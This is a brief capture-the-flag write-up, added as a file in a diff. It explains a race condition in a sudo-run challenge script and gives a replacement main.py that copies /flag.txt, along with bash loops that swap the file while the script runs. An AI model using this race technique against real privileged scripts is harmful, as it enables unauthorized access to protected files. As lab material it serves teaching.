@@ -1,0 +1,32 @@
+`ctf` user can run /challenge/script.sh with sudo
+
+the script does this on line 40,
+sudo -u "${CTF_CRACKED_USER}" "${CTF_DIR}/${MAIN_PY}" "${string}"
+
+so we can have ctf-cracked user run main.py
+but on line 34,
+chown -R "root:root" "${CTF_DIR}"
+
+the root takes ownership of our home directory
+
+basically we have a window of,
+
+    27  reset_challenge () {
+    28    reset_file "${MAIN_PY}"
+    29    reset_file "${MODULE_PY}"
+    30 }
+
+reset_challenge as the name says, reset our challenge...
+"Race-Condition Bruh" :)
+
+fake-main.py
+#!/usr/bin/env python3
+import os
+os.system("cat /flag.txt > /tmp/abc")
+
+
+exploit-thread x4
+while true; do cp main.py /home/ctf/main.py &>/dev/null; done &
+
+user-thread x1
+while true; do sudo /challenge/script.sh lol &>/dev/null; done &
